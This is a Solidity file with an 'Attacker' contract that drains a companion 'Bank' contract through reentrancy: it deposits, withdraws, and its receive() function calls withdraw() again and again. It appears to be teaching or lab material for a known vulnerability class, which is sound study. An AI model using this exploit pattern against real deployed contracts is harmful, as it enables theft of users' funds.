// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import {Bank} from "./Bank.sol";

contract Attacker {
    Bank public bank;

    constructor(address payable _bank) {
        bank = Bank(_bank);
    }

    function attack() public payable {
        // The attacker first deposits into the bank to establish a legitimate balance
        bank.deposit{value: msg.value}();

        // The attacker initiates the attack by calling `withdraw()`
        // This triggers the attacker's `receive()` function, which recursively calls `withdraw()` again
        bank.withdraw(msg.value);
    }

    receive() external payable {
        if (address(bank).balance >= msg.value) {
            bank.withdraw(msg.value);
        }
    }
}
